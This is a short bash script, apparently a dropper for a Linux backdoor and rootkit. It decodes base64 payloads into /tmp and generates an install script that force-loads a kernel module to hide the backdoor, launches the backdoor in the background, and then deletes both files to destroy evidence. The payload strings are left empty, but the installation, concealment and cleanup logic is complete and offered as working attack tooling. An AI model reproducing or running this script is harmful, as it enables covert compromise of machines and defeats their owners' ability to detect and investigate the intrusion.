#!/bin/bash

backdoor_bin=''
backdoor_path='/tmp/backdoor'
rootkit_bin=''
rootkit_path='/tmp/rootkit.ko'
install_script='install.sh'

if [ `id -u` == '0' ]
then
    echo 'je suis root! Lets go baby'
else
    echo 'je ne suis pas root, dommage...'
fi

# Create backdoor file
echo $backdoor_bin > bin.txt
base64 -d bin.txt > $backdoor_path
rm bin.txt
chmod 700 $backdoor_path

# Create rootkit file
cmd="'import base64;f=open(\"$rootkit_path\",\"wb\");f.write(base64.b64decode(\"$rootkit_bin\"));f.close()'"
python_cmd="python -c $cmd"
eval "$python_cmd"

if [ "$?" != 0 ]; then
    echo "Error creating $rootkit_path"
fi
chmod 700 $rootkit_path

# Shoudl I export variable environment (BACKDOOR_PATH & ROOTKIT_PATH) 
# and hide them from regular user.

cat <<EOF>> $install_script
#!/bin/bash

lkm_path="$rootkit_path"
bd_path="$backdoor_path"

start_rootkit() {
    if [ ! -f \$lkm_path ]; then
        echo "\$lkm_path does not exist!"
    fi
    # enable hiding of the backdoor
    mv \$lkm_path /lib/modules/`uname -r`/
    depmod -a
    modprobe -f \`basename \$lkm_path\` > /dev/null 2>&1
}

start_backoor() {
    if [ ! -f \$bd_path ]; then
        echo "\$bd_path does not exist!"
    fi

    #launch the backdoor
    \$bd_path &
}

stop_rootkit() {
    rmmod \`basename \$lkm_path\` > /dev/null 2>&1
}

destroy_evidences() {
    rm \$lkm_path
    rm \$bd_path
}
EOF

chmod 700 $install_script
#launch the function in install.sh
source $install_script; start_rootkit
source $install_script; start_backoor
source $install_script; destroy_evidences
rm $install_script
